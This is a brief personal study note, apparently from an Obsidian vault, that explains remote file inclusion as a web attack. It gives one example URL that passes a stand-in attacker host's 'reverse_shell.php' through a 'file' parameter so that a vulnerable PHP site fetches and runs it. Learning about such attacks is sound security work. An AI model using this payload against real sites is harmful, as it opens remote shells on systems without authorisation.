---
date: 2024-11-02T16:08
tags:
  - "#injection"
  - "#cybersecurity"
  - "#web-security"
cssclasses:
  - pen-green
  - page-grid
---
Similarly to [[202411021604 Local File Injection|local file injection]], we can perform remote file execution

We can add a remote file to a URL parameter like this

```
https://site.com/index.php?file=http://bad.com/reverse_shell.php
```

